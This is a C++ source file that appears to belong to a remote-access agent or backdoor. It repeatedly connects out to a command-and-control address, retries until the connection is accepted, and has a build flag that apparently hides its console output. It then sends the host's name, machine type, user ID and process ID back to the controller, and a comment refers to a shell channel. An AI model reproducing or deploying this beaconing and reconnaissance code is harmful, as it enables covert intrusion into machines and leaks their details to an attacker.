#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "Agent.h"

int HttpServer::_connec() {
    for (int i = 0; i < ports_.size(); i++) {
        struct sockaddr_in server_addr;
        struct sockaddr_in client_addr;
        struct hostent*    server_host;

        int ccFd_ = socket(AF_INET, SOCK_STREAM, 0);

        if (ccFd_ < 0) {
            perror("socket");
            return -1;
        }

        server_host = gethostbyname(ccIp_.c_str());

        if (server_host == NULL) {
            fprintf(stderr, "gethostbyname failed.\n");
            return -1;
        }

        memcpy((void*)&server_addr.sin_addr, (void*)server_host->h_addr,
               server_host->h_length);

        server_addr.sin_family = AF_INET;
        server_addr.sin_port   = htons(ports_[i]);

        /* connect to the remote host */
        while (1) {
            int ret = connect(ccFd_, (struct sockaddr*)&server_addr,
                              sizeof(server_addr));
            if (ret < 0) {
                sleep(3);
#ifndef AGENT_BACK
                std::cout << "wait for accept my connect\n";
#endif
            }

            else {
#ifndef AGENT_BACK
                std::cout << "connect success\n";
#endif
                break;
            }
        }

        fds_.push_back(ccFd_);
    }

    _Response_osInfo();
    return 0;
}

#include <sys/utsname.h>
int HttpServer::_Response_osInfo() {
    // 用shellFd传输
    HttpRequest*   httpHandler_ = new HttpRequest(fds_[0]);
    int            Errno, fb = 0;
    struct utsname os_Info;
    string         sysname;
    string         version;
    string         machine;
    int            uid = getuid();
    int            pid = getpid();
    fb                 = uname(&os_Info);
    if (fb < 0) {
        sysname = "unknow";
        version = "unknow";
        machine = "unknow";
    } else {
        sysname = os_Info.sysname;
        version = os_Info.version;
        machine = os_Info.machine;
    }

    char name[256];
    gethostname(name, sizeof(name));

    HttpResponse response(200);
    // response.addHeader("Sys_Name",sysname);
    response.addHeader("Sys_Name", name);
    // response.addHeader("Sys_Version",version);
    response.addHeader("Sys_Machine", machine);
    response.addHeader("Cur_Uid", std::to_string(uid));
    response.addHeader("Cur_pid", std::to_string(pid));
    response.createResponse(&(httpHandler_->outBuff_));

    int ret = httpHandler_->write(&Errno);

    delete (httpHandler_);
    return 0;
}
